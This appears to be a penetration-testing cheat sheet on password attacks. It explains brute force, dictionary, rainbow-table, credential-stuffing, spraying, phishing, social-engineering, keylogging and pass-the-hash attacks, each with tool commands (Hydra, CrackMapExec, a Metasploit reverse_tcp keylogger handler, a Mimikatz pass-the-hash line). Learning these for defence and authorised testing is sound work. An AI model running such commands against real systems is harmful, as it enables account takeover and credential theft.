# Summary

Password attacks target the authentication mechanism of a system to gain unauthorized access. These attacks can exploit weak passwords, misconfigurations, or vulnerabilities in the authentication process. Below are detailed explanations of various password attacks, their mechanisms, and examples.

# Brute-Force Attack

**Summary:** 
A brute-force attack involves systematically trying every possible password combination until the correct one is found. This attack is typically automated and can be time-consuming, especially for complex passwords.

**Mechanism:**
- The attacker uses a tool to generate and try all possible passwords against the target system's login interface.
- The attack can be targeted against various protocols like SSH, RDP, FTP, etc.

**Example Command:**
Using `Hydra` for a brute-force attack on an SSH server:
```
hydra -l <username> -P <password_list> ssh://<target_ip>:<target_port>
```
- `<username>`: The username to target.
- `<password_list>`: A file containing possible passwords.
- `<target_ip>`: The IP address of the target.
- `<target_port>`: The port on which SSH is running (default: 22).

# Dictionary Attack

**Summary:** 
A dictionary attack involves using a precompiled list of words (dictionary) as potential passwords. Unlike brute-force attacks, which try all possible combinations, dictionary attacks rely on common passwords, phrases, or words that users might choose.

**Mechanism:**
- The attacker uses a tool to iterate through a list of common passwords and attempts to log in with each one.
- This method is faster than brute-force attacks but less exhaustive.

**Example Command:**
Using `John the Ripper` for a dictionary attack:
```
john --wordlist=<password_list> --format=<format> <target_file>
```
- `<password_list>`: A file containing possible passwords.
- `<format>`: The format of the hashed passwords (e.g., `NT`, `SHA256`).
- `<target_file>`: The file containing the hashed passwords.

# Rainbow Table Attack

**Summary:** 
A rainbow table attack uses precomputed tables of hashed passwords to reverse cryptographic hash functions. These tables allow attackers to quickly find the original password by matching the hash.

**Mechanism:**
- The attacker obtains a hash of a password and searches the rainbow table for a matching hash.
- If a match is found, the corresponding plaintext password is retrieved.

**Example Command:**
Using `RainbowCrack` to crack a hash:
```
rtgen md5 loweralpha-numeric 1 7 0 2400 8000000
rtsort .
rcrack . -h <hash_value>
```
- `<hash_value>`: The hash value of the password.

# Credential Stuffing

**Summary:** 
Credential stuffing involves using username and password pairs obtained from previous breaches to gain unauthorized access to other services. This attack leverages the fact that users often reuse passwords across multiple sites.

**Mechanism:**
- The attacker uses automated tools to try the compromised credentials across various websites or services.
- If users have reused passwords, the attacker gains access to multiple accounts.

**Example Command:**
Using `Sentry MBA` for credential stuffing:
```
SentryMBA.exe /config <config_file>
```
- `<config_file>`: A configuration file that includes the target site and credential pairs.

# Password Spraying

**Summary:** 
Password spraying involves trying a small number of commonly used passwords against a large number of accounts. This method avoids detection mechanisms that lock accounts after too many failed login attempts.

**Mechanism:**
- The attacker selects a few common passwords and attempts to log in across multiple user accounts.
- This method is stealthier than brute-force attacks because it spreads out the login attempts.

**Example Command:**
Using `CrackMapExec` for password spraying:
```
crackmapexec smb <target_ip> -u <user_list> -p <password>
```
- `<target_ip>`: The IP address of the target system.
- `<user_list>`: A file containing a list of usernames.
- `<password>`: The common password to try.

# Phishing for Credentials

**Summary:** 
Phishing involves tricking users into revealing their credentials by posing as a legitimate entity. Attackers often use fake websites, emails, or messages to collect passwords.

**Mechanism:**
- The attacker sends an email or message that appears to be from a trusted source, asking the user to log in.
- The user is redirected to a fake login page where their credentials are harvested.

**Example Scenario:**
Using `Gophish` to conduct a phishing campaign:
```
gophish
```
- Set up a phishing campaign, including email templates and fake login pages.
- Track which users fall for the phishing attempt and collect their credentials.

# Social Engineering

**Summary:** 
Social engineering attacks manipulate individuals into divulging their passwords by exploiting human psychology rather than technical vulnerabilities.

**Mechanism:**
- The attacker might impersonate an IT staff member and ask the user for their password to "fix an issue."
- Alternatively, the attacker could use tactics like pretexting or baiting to gain trust and extract information.

**Example Scenario:**
No specific command, as social engineering relies on human interaction rather than tools. However, tools like `SET (Social-Engineer Toolkit)` can help automate some aspects of social engineering:
```
setoolkit
```
- Choose the social engineering attack vector and follow the prompts to create a convincing scenario.

# Keylogging

**Summary:** 
Keylogging involves capturing keystrokes to steal passwords as they are typed by the user. This attack can be performed via hardware devices or malware.

**Mechanism:**
- The attacker installs a keylogger on the victim’s machine, which records all keystrokes, including passwords.
- The collected data is sent back to the attacker for analysis.

**Example Command:**
Using `Metasploit` to deliver a keylogger payload:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <attack_ip>
set lport <attack_port>
exploit
keyscan_start
```
- `<attack_ip>`: The IP address of the attacker's machine.
- `<attack_port>`: The port on which the attacker's machine is listening.

# Pass-the-Hash

**Summary:** 
Pass-the-hash (PtH) attacks involve using a hash of a password to authenticate without needing the plaintext password itself. This attack exploits the way some authentication protocols (e.g., NTLM) handle password hashes.

**Mechanism:**
- The attacker captures the hash from a compromised machine and uses it to authenticate on other machines within the network.
- No password cracking is required; the hash itself is sufficient for authentication.

**Example Command:**
Using `Mimikatz` for a pass-the-hash attack:
```
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:<program>
```
- `<username>`: The username for the account.
- `<domain>`: The domain name.
- `<hash>`: The NTLM hash of the password.
- `<program>`: The program to run with the stolen credentials (e.g., `cmd.exe`).

# Resources

|**Website**|**URL**|
|-|-|
| OWASP Password Attack Prevention Cheat Sheet | [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) |
| Hydra Tool Documentation                     | [Hydra](https://tools.kali.org/password-attacks/hydra)   |
| John the Ripper Documentation                | [John the Ripper](https://www.openwall.com/john/)       |
| Mimikatz Tool Guide                          | [Mimikatz](https://github.com/gentilkiwi/mimikatz)      |
| Social-Engineer Toolkit (SET) Documentation  | [SET](https://github.com/trustedsec/social-engineer-toolkit) |